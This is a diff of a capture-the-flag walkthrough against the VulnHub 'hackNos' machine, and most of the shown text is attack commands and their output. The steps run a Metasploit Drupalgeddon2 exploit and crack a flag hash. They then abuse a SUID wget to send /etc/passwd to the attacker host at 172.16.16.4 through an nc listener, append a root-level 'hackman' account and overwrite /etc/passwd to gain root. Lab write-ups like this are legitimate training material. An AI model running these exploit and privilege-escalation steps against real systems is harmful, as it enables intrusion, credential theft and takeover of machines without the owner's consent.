@@ -51,7 +51,7 @@ pip3 install dscan
 pip3 install cement
 pip3 install pystache
 pip3 install -U droopescan
-
+[*]
 7. Run droopescan: droopescan scan drupal -u http://172.16.16.27/drupal
 root@hostmachine:~/vulnhubdb# droopescan scan drupal -u http://172.16.16.27/drupal
 [+] Plugins found:                                                              
@@ -70,24 +70,23 @@ root@hostmachine:~/vulnhubdb# droopescan scan drupal -u http://172.16.16.27/drup
     Default changelog file - http://172.16.16.27/drupal/CHANGELOG.txt
 
 [+] Scan finished (0:00:05.986432 elapsed)
-
-
+[*]
 8. searchsploit drupal 7.5
 rupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                            | exploits/php/webapps/44557.rb
 Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                         | exploits/php/webapps/44542.txt
 Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution       
-
+[*]
 9. msfconsole
 use exploit/unix/webapp/drupal_drupalgeddon2
 set TARGETURI /drupal
 set RHOST 172.16.16.27
 set LHOST 172.16.16.4
 exploit -j -z
-
+[*]
 10. Iteract with the session
 sessions -i 1
 shell
-
+[*]
 11. Found file /home/james/user.txt
 cat user.txt                                  
   | |                                 
@@ -96,7 +95,7 @@ cat user.txt
  (   /        | |_| |\__ \|  __/| |   
   |_|          \__,_||___/ \___||_|   
 MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
-
+[*]
 12. Crack pass: echo 'bae11ce4f67af91fa58576c1da2aad4b' > flag.hash
 root@hostmachine:~# john flag.hash --format=Raw-MD5 -w /usr/share/wordlists/rockyou.txt
 Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
@@ -105,16 +104,16 @@ Loaded 52 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3
 Warning: no OpenMP support for this hash type, consider --fork=12
 Press 'q' or Ctrl-C to abort, almost any other key for status
 emerald          (?)
-
+[*]
 13. su - james
 su: must be run from a terminal
-
+[*]
 14. move to interactive terminal:
 python3 -c "import pty;pty.spawn('/bin/sh')"
-
+[*]
 15. su - james && su - root
 **not the right password!?**
-
+[*]
 16.  cat /etc/cron.dain^?ly/passwd
 cat /etc/cron.daily/passwd
 #!/bin/sh
@@ -126,13 +125,13 @@ for FILE in passwd group shadow gshadow; do
         cmp -s $FILE.bak /etc/$FILE     && continue
         cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
 done
-
+[*]
 17. ls /var/backups **no passwd file**
-
+[*]
 18. ls
 cat alexander.txt 
 KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
-
+[*]
 19. Decode string further
 +++++ +++++ [->++ +++++ +++<] >++++ ++.-- ----- --.<+ ++[-> +++<] >+++.
 ----- ---.< +++[- >+++< ]>+++ ++.<+ +++++ +[->- ----- -<]>- ----- --.<+
@@ -140,14 +139,14 @@ KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4g
 >+++< ]>+++ +.<++ +++++ [->-- ----- <]>-. <+++[ ->--- <]>-- -.+.- ---.+
 ++.<
 **looks like ook or brainfuck. But I couldn't make heads or tails of it.**
-
+[*]
 20. Upload linenum.sh
 chmod u+x linenum.sh
 ./linenum.sh
 [+] Possibly interesting SUID files:
 -rwsr-xr-x 1 root root 506200 May  9  2018 /usr/bin/wget
 Ubuntu 4.4
-
+[*]
 21. POST /etc/passwd
 **listen: nc -nvlp 80
 **POST: wget --post-file=/etc/passwd 172.16.16.4
@@ -182,24 +181,22 @@ dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
 james:x:1000:1000:james,,,:/home/james:/bin/bash
 sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
 mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
-
+[*]
 22. Save as file: passwd. And edit user: echo "hackman:$(openssl passwd -1 -salt hackman password):0:0:root:/root:/bin/bash" >> passwd
-
+[*]
 23. save passwd file
 start http server: python -m SimpleHTTPServer 80
 download file:
   cd /etc
-  
-
+[*]
 23. login as hackman: 
 u - hackman
 su: must be run from a terminal
-
+[*]
 24. upgrade terminal
 python3 -c "import pty;pty.spawn('/bin/sh')"
-
-
-22. su - hackman
+[*]
+25. su - hackman
 cat root.txt
 root.txt
 root@hackNos:~# cat o^?root.txt
@@ -220,7 +217,7 @@ Author : Rahul Gehlaut
 Linkedin : https://www.linkedin.com/in/rahulgehlaut/
 
 Blog : www.hackNos.com
-
+[*]
 
 
 
